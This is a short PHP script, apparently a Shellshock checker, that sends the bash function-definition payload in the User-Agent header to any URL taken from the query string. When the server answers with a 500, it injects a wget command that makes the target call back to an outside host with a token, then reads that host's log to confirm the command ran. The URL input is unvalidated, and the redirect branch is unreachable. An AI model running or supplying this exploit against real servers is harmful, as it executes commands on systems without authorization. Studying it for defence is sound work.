<?php
error_reporting(0);
$url = $_GET['url'];
$header = stream_context_create(
    array(
        'http' => array(
            'method'  => 'GET',
            'header'  => 'User-Agent: () { :;};echo "4141nothing4141";'
        )
    )
);

$req = file_get_contents($url, false, $header);

if(preg_match("/(200|201|202|404|403|301|302|307|308)/", $http_response_header[0]))
{ echo "Everything seems cool. Not Vulnerable" ;}
else if(preg_match("/500/", $http_response_header[0]))
{ echo "Oh Snap,Server might be Vulnerable";


$token = md5(uniqid(rand(), true));
$header = 'User-Agent: () { :;};wget https://www.dr4cun0.com/shellshock/callme.php?id=' . $token; 
$x = stream_context_create(
    array(
	'http' => array(
            'method'  => 'GET',
            'header'  => $header
        )
    )
);

$req = file_get_contents($url, false, $x);


//token check
$url = 'https://www.dr4cun0.com/shellshock/id.log';

$header = stream_context_create(
    array(
	'http' => array(
            'method'  => 'GET',
            'header'  => 'none'
        )
    )
);

$req = file_get_contents($url, false, $header);
if(preg_match("/$token/",$req))
{
echo 'Check confirmed. Server Vulnerable';
}
}
else if(preg_match("/(301|302|307|308)/", $http_response_header[0]))
{ echo 'Redirected to some other location. Please use final URL. This probably means the server is not vulnerable';}
else
{ echo "Error in Connection.";}

?>
